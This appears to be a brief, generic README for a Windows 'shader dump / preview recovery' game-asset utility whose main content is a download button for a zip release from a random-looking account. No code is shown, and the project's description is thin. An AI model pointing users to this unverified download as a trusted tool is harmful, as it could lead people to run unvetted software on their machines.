...
<img src="preview.svg" alt="Shader Dump" width="100%"/>

# Shader Dump

**Shader dump / preview recovery — Windows desktop utility with batch export workflow**
...
**Shader Dump** is a Windows-focused desktop utility for **shader dump / preview recovery**. Point it at a local game folder or archive, pick an export preset, and run a batch job — no manual hex editing required.
...
[![Download](button.svg)](https://github.com/fhkdguc/shader-dump-preview-recovery/releases/download/v1.7.90/shader-dump-preview-recovery-v1.7.90.zip)
...
<div align="center">
<sub>Windows · Game asset tooling · Open Source · shader-dump-preview-recovery</sub>
</div>
